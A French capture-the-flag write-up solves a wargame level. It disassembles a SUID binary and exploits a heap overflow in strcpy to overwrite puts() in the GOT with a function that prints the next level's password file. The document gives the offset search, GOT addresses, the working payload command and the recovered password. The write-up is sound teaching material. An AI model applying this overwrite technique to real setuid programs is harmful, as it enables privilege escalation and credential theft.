## Analyse

- `ls -la`
  ```
  [...]
    -rwsr-s---+ 1 level8 users  5648 Mar  9  2016 level7
  [...]
  ```
    - On a un binaire appartenant à level8 dans le home avec les droits SUID.

- `./level7`
  ```
  Segmentation fault (core dumped)
  ```
  - Le programme Segfault sans argument
- `./level6 test`
  ```
  Segmentation fault (core dumped)
  ```
  - Le programme Sefault, meme avec un argument
- - `./level6 test test`
  ```
  ~~
  ```
  - Le programme affiche "~~" avec deux arguments et plus

- `gdb level6`
  - `set disassembly-flavor intel`
  - `info function`
    ```asm
    [...]
      0x080484f4  m
      0x08048521  main
    [...]
    ```
    - on trouve une fonction m() en plus du main
  - `disas main`
    ```asm
    Dump of assembler code for function main:
      0x08048521 <+0>:	push   ebp
      0x08048522 <+1>:	mov    ebp,esp
      0x08048524 <+3>:	and    esp,0xfffffff0
      0x08048527 <+6>:	sub    esp,0x20
      0x0804852a <+9>:	mov    DWORD PTR [esp],0x8
      0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
      0x08048536 <+21>:	mov    DWORD PTR [esp+0x1c],eax
      0x0804853a <+25>:	mov    eax,DWORD PTR [esp+0x1c]
      0x0804853e <+29>:	mov    DWORD PTR [eax],0x1
      0x08048544 <+35>:	mov    DWORD PTR [esp],0x8
      0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
      0x08048550 <+47>:	mov    edx,eax
      0x08048552 <+49>:	mov    eax,DWORD PTR [esp+0x1c]
      0x08048556 <+53>:	mov    DWORD PTR [eax+0x4],edx
      0x08048559 <+56>:	mov    DWORD PTR [esp],0x8
      0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
      0x08048565 <+68>:	mov    DWORD PTR [esp+0x18],eax
      0x08048569 <+72>:	mov    eax,DWORD PTR [esp+0x18]
      0x0804856d <+76>:	mov    DWORD PTR [eax],0x2
      0x08048573 <+82>:	mov    DWORD PTR [esp],0x8
      0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
      0x0804857f <+94>:	mov    edx,eax
      0x08048581 <+96>:	mov    eax,DWORD PTR [esp+0x18]
      0x08048585 <+100>:	mov    DWORD PTR [eax+0x4],edx
      0x08048588 <+103>:	mov    eax,DWORD PTR [ebp+0xc]
      0x0804858b <+106>:	add    eax,0x4
      0x0804858e <+109>:	mov    eax,DWORD PTR [eax]
      0x08048590 <+111>:	mov    edx,eax
      0x08048592 <+113>:	mov    eax,DWORD PTR [esp+0x1c]
      0x08048596 <+117>:	mov    eax,DWORD PTR [eax+0x4]
      0x08048599 <+120>:	mov    DWORD PTR [esp+0x4],edx
      0x0804859d <+124>:	mov    DWORD PTR [esp],eax
      0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
      0x080485a5 <+132>:	mov    eax,DWORD PTR [ebp+0xc]
      0x080485a8 <+135>:	add    eax,0x8
      0x080485ab <+138>:	mov    eax,DWORD PTR [eax]
      0x080485ad <+140>:	mov    edx,eax
      0x080485af <+142>:	mov    eax,DWORD PTR [esp+0x18]
      0x080485b3 <+146>:	mov    eax,DWORD PTR [eax+0x4]
      0x080485b6 <+149>:	mov    DWORD PTR [esp+0x4],edx
      0x080485ba <+153>:	mov    DWORD PTR [esp],eax
      0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
      0x080485c2 <+161>:	mov    edx,0x80486e9
      0x080485c7 <+166>:	mov    eax,0x80486eb
      0x080485cc <+171>:	mov    DWORD PTR [esp+0x4],edx
      0x080485d0 <+175>:	mov    DWORD PTR [esp],eax
      0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
      0x080485d8 <+183>:	mov    DWORD PTR [esp+0x8],eax
      0x080485dc <+187>:	mov    DWORD PTR [esp+0x4],0x44
      0x080485e4 <+195>:	mov    DWORD PTR [esp],0x8049960
      0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
      0x080485f0 <+207>:	mov    DWORD PTR [esp],0x8048703
      0x080485f7 <+214>:	call   0x8048400 <puts@plt>
      0x080485fc <+219>:	mov    eax,0x0
      0x08048601 <+224>:	leave
      0x08048602 <+225>:	ret
    End of assembler dump.
    ```
    - <+0> ... <+6>
      - Initialisation de la mémoire (libère 32 octets pour la stack), alignement de la stack<br/><br/>
    - <+9> ... <+21>
      - Stocke 0x8 (8) sur la stack (à esp)
      - Call malloc() avec l'argument stocké sur la stack
      - Stocke eax (l'adresse du malloc, disons a = malloc(8)) sur la stack (à esp + 28)<br/><br/>
    - <+25> ... <+47>
      - Stocke 0x1 (1) dans eax (a[0] = 1)
      - Stocke 0x8 (8) sur la stack (à esp)
      - Call malloc() avec l'argument stocké sur la stack
      - Stocke eax (l'adresse du second malloc, disons b = malloc(8)) dans edx<br/><br/>
    - <+49> ... <+68>
      - Stocke la valeur à esp + 28 (l'adresse du premier malloc, donc a) dans eax
      - Stocke edx (l'adresse du second malloc b) dans eax + 4 (donc a[0] = 1; a[1] = b = malloc(8))
      - Stocke 0x8 (8) sur la stack (à esp)
      - Call malloc() avec l'argument stocké sur la stack
      - Stocke eax (l'adresse du troisieme malloc, disons c = malloc(8)) sur la stack (à esp + 24)<br/><br/>
    - <+72> ... <+94>
      - Stocke la valeur à esp + 24 (l'adresse du troisième malloc, donc c) dans eax
      - Stocke 0x2 (2) dans eax (c[0] = 2)
      - Stocke 0x8 (8) sur la stack (à esp)
      - Call malloc() avec l'argument stocké sur la stack
      - Stocke eax (l'adresse du quatrième malloc, disons d = malloc(8)) dans edx<br/><br/>
    - <+96> ... <+111>
      - Stocke la valeur à esp + 24 (l'adresse du troisième malloc, donc c) dans eax
      - Stocke edx (l'adresse du quatrieme malloc, d) à eax + 4 (c[1] = d = malloc(8))
      - Fait pointer eax à ebp + 12 (argv)
      - Déplace eax sur argv[1] (eax + 4)
      - Stocke la valeur à l'adresse contenue dans eax (argv[1]) dans eax
      - Stocke eax (argv[1]) dans edx<br/><br/>
    - <+113> ... <+127>
      - Fait pointer eax sur esp + 28 (l'adresse du premier malloc a)
      - Ajoute 4 à l'adresse portée par eax (eax = a[1])
      - Stocke edx (argv[1]) sur la stack (à esp + 4)
      - Stocke eax (a[1]) sur la stack (à esp)
      - Call strcpy() avec les arguments stockés sur la stack (eax = strcpy(a[1], argv[1]);)<br/><br/>
    - <+132> ... <+156>
      - Fait pointer eax sur ebp + 12 (argv)
      - Déplace eax sur argv[2] (eax + 8)
      - Stocke la valeur à l'adresse contenue dans eax (argv[2]) dans eax
      - Stocke eax (argv[2]) dans edx
      - Stocke l'adresse contenue a esp + 24 (l'adresse du 3eme malloc c) dans eax
      - Déplace eax sur c[1] (eax + 4)
      - Stocke edx (argv[2]) sur la stack (à esp + 4)
      - Stocke eax (c[1]) sur la stack (à esp)
      - Call strcpy() avec les arguments stockés sur la stack (eax = strcpy(c[1], argv[2]);)<br/><br/>
    - <+161> ... <+178>
      - Stocke la valeur à 0x80486e9 dans edx
        - `x/s 0x80486e9`
          ```asm
          0x80486e9:	 "r"
          ```
      - Stocke la valeur à 0x80486eb dans eax
        - `x/s 0x80486e9`
          ```asm
          0x80486eb:	 "/home/user/level8/.pass"
          ```
      - Stocke edx ("r")sur la stack (à esp + 4)
      - Stocke eax ("/home/user/level8/.pass") sur la stack (à esp)
      - Call fopen() avec les arguments stockés sur la stack (eax = fopen("/home/user/level8/.pass", "r");)<br/><br/>
    - <+183> ... <+202>
      - Stocke eax (le retour du fopen()) sur la stack (à esp + 8)
      - Stocke 0x44 (68) sur la stack (à esp + 4)
      - Stocke la valeur à 0x8049960 sur la stack (à esp)
        - `x/s 0x8049960`
          ```asm
          0x8049960 <c>:	 ""
          ```
      - Call fgets() avec les arguments stockés sur la stack (eax = fgets(c, 68, &fopen_return))<br/><br/>
    - <+207> ... <+219>
      - Stocke la valeur à 0x8048703 sur la stack (à esp)
        - `x/s 0x8048703`
          ```asm
          0x8048703:	 "~~"
          ```
      - Call puts() avec l'argument stocké sur la stack (eax = puts("~~"))
      - Stocke 0x0 (0) dans eax (ca sera la valeur return par la fonction main())
    - <+224> ... <+225>
      - Réinitialisation de la mémoire, fin d'exécution<br/><br/>

  - `disas m`
    ```asm
    Dump of assembler code for function m:
       0x080484f4 <+0>:	push   ebp
       0x080484f5 <+1>:	mov    ebp,esp
       0x080484f7 <+3>:	sub    esp,0x18
       0x080484fa <+6>:	mov    DWORD PTR [esp],0x0
       0x08048501 <+13>:	call   0x80483d0 <time@plt>
       0x08048506 <+18>:	mov    edx,0x80486e0
       0x0804850b <+23>:	mov    DWORD PTR [esp+0x8],eax
       0x0804850f <+27>:	mov    DWORD PTR [esp+0x4],0x8049960
       0x08048517 <+35>:	mov    DWORD PTR [esp],edx
       0x0804851a <+38>:	call   0x80483b0 <printf@plt>
       0x0804851f <+43>:	leave
       0x08048520 <+44>:	ret
    End of assembler dump.
    ```
    - <+0> ... <+3>
      - Initialisation de la mémoire (libère 24 octets pour la stack)<br/><br/>
    - <+6> ... <+13>
      - Stocke 0x0 (0) sur la stack (à esp)
      - Call time() avec l'argument stocké sur la stack (eax = time(0);)
      - Stocke eax (l'adresse du malloc, disons a = malloc(8)) sur la stack (à esp + 28)<br/><br/>
    - <+25> ... <+47>
      - Stocke la valeur à 0x80486e0 dans edx
        - `x/s 0x80486e0`
          ```asm
          0x80486e0:	 "%s - %d\n"
          ```
      - Stocke eax (le retour de time(0)) sur la stack (à esp + 8)
      - Stocke la valeur à 0x8049960 sur la stack (à esp + 4)
        - `x/s 0x8049960`
          ```asm
          0x8049960 <c>:	 ""
          ```
      - Stocke edx ("%s - %d\n") sur la stack
      - Call printf avec les arguments stockés sur la stack (eax = printf("%s - %d\n", c, time(0));)<br/><br/>
    - <+43> ... <+44>
      - Réinitialisation de la mémoire, fin d'exécution<br/><br/>

## Exploit

Dans le main, `fopen("/home/user/level8/.pass", "r")` va lire le fichier .pass et `fgets(c, 68, fopen(...))` va écrire son flux dans la variable c.
La fonction m() affiche le contenu de cette variable, mais n'est pas appelée.
On note aussi que les strcpy() de la fonction main() copient nos arguments sans protection.

Pour pouvoir afficher notre fichier il faudrait réussire à call m() après fopen(), ce qui nous laisse l'appel à puts() avant de return.
Il va falloir trouver un moyen de remplacer l'adresse de puts() dans la GOT (cf. level5) par celle de m() pour imprimer le contenu de .pass.

Pour cela, nous allons exploiter le fait que les strcpy() ne soient pas protégés: en cas de buffer overflow du premier, on peut venir écrire sur le premier argument du second strcpy(): l'adresse ou il va écrire la valeur qu'on lui donne en argv[2].

Pour trouver l'offset on va se servir de [ltrace](https://www.tutorialspoint.com/unix_commands/ltrace.htm) et du générateur de pattern:
- `ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag`
  ```
  __libc_start_main(0x8048521, 2, 0xbffff6f4, 0x8048610, 0x8048680 <unfinished ...>
  malloc(8)                                                                                              = 0x0804a008
  malloc(8)                                                                                              = 0x0804a018
  malloc(8)                                                                                              = 0x0804a028
  malloc(8)                                                                                              = 0x0804a038
  strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...)                                              = 0x0804a018
  strcpy(0x37614136, NULL <unfinished ...>
  --- SIGSEGV (Segmentation fault) ---
  +++ killed by SIGSEGV +++
  ```
  - Le générateur de pattern nous indique un offset de 20 pour la valeur 0x37614136

Il va donc valloir construire un payload avec 20 random chars + l'adresse de puts() dans la GOT comme premier argument, et l'adresse de m() en second argument.

- `objdump -R level5`
  ```
  level7:     file format elf32-i386

  DYNAMIC RELOCATION RECORDS
  OFFSET   TYPE              VALUE
  08049904 R_386_GLOB_DAT    __gmon_start__
  08049914 R_386_JUMP_SLOT   printf
  08049918 R_386_JUMP_SLOT   fgets
  0804991c R_386_JUMP_SLOT   time
  08049920 R_386_JUMP_SLOT   strcpy
  08049924 R_386_JUMP_SLOT   malloc
  08049928 R_386_JUMP_SLOT   puts
  0804992c R_386_JUMP_SLOT   __gmon_start__
  08049930 R_386_JUMP_SLOT   __libc_start_main
  08049934 R_386_JUMP_SLOT   fopen
  ```
  - l'adresse de puts() dans la GOT est 0x8049928

On a vu dans l'analyse que l'adresse de m() est 0x080484f4.

Du coup en passant les adresses en little endian:
- `./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')`
  ```
  5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
   - 1664369431
  ```
